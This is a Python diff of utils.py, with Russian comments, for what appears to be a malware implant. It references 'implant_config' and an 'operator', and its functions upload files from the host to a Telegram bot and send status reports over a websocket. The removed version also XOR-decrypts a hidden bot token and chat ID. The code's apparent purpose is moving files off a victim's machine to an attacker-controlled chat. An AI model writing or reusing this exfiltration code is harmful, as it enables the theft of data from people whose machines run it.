@@ -1,60 +1,36 @@
-# --- Файл: utils.py (ИСТИННАЯ ФИНАЛЬНАЯ ВЕРСИЯ) ---
-import requests
+# Файл: utils.py
 import os
+import requests
+import json
 import asyncio
-from itertools import cycle # Важный импорт для дешифровки
+import settings # <-- Импортируем наш ИСПРАВЛЕННЫЙ settings
 
-import settings
-from implant_config import TEMP_PATH
+# ==============================================================================
+# ВОТ КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ: Теперь эта строка РАБОТАЕТ,
+# потому что settings.APP_DATA_PATH СУЩЕСТВУЕТ.
+# ==============================================================================
+TEMP_PATH = os.path.join(settings.APP_DATA_PATH, "temp")
 
-# --- ВОТ ОН, СУКА. ДЕШИФРАТОР. ---
-def get_secret(encrypted_secret):
-    """
-    Расшифровывает секрет, используя тот же XOR-алгоритм, что и в encrypt_secrets.py.
-    """
-    key = settings.ENCRYPTION_KEY
-    # XOR-дешифровка - это то же самое, что и шифрование
-    decrypted = "".join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_secret, cycle(key)))
-    return decrypted
+# Создаём рабочие папки
+os.makedirs(settings.APP_DATA_PATH, exist_ok=True)
+os.makedirs(TEMP_PATH, exist_ok=True)
 
-# ----------------------------------------
-
-def send_telegram_message(text):
-    bot_token = get_secret(settings.ENC_TELEGRAM_BOT_TOKEN)
-    chat_id = get_secret(settings.ENC_TELEGRAM_CHAT_ID)
-    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text}
-    try:
-        requests.post(url, json=payload, timeout=10)
-        return True
-    except requests.RequestException:
-        return False
+def send_status_to_operator(ws, loop, message):
+    """Отправляет статус оператору, используя aiohttp."""
+    if ws and not ws.closed:
+        try:
+            payload = json.dumps({'type': 'status', 'data': message})
+            asyncio.run_coroutine_threadsafe(ws.send_str(payload), loop)
+        except Exception as e:
+            print(f"[!] Не удалось отправить статус: {e}")
 
 def send_telegram_document(file_path, caption=""):
-    bot_token = get_secret(settings.ENC_TELEGRAM_BOT_TOKEN)
-    chat_id = get_secret(settings.ENC_TELEGRAM_CHAT_ID)
-    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+    """Отправляет документ в Telegram."""
+    url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendDocument"
     try:
         with open(file_path, "rb") as f:
-            files = {"document": f}
-            data = {"chat_id": chat_id, "caption": caption}
-            response = requests.post(url, files=files, data=data, timeout=30)
-            return response.json().get("ok", False)
-    except (requests.RequestException, FileNotFoundError):
+            response = requests.post(url, files={'document': f}, data={'chat_id': settings.CHAT_ID, 'caption': caption}, timeout=20)
+            return response.status_code == 200
+    except Exception as e:
+        print(f"[!!!] Критическая ошибка отправки документа в Telegram: {e}")
         return False
-
-def send_status_to_operator(ws, loop, message, is_error=False):
-    if not loop or loop.is_closed():
-        return
-
-    payload = {'type': 'status', 'data': f"❌ {message}" if is_error else f"✅ {message}"}
-
-    async def send_message():
-        if not ws.closed:
-            try:
-                await ws.send_json(payload)
-            except (ConnectionResetError, asyncio.CancelledError):
-                # Игнорируем ошибки, если оператор отключился в момент отправки
-                pass
-
-    asyncio.run_coroutine_threadsafe(send_message(), loop)
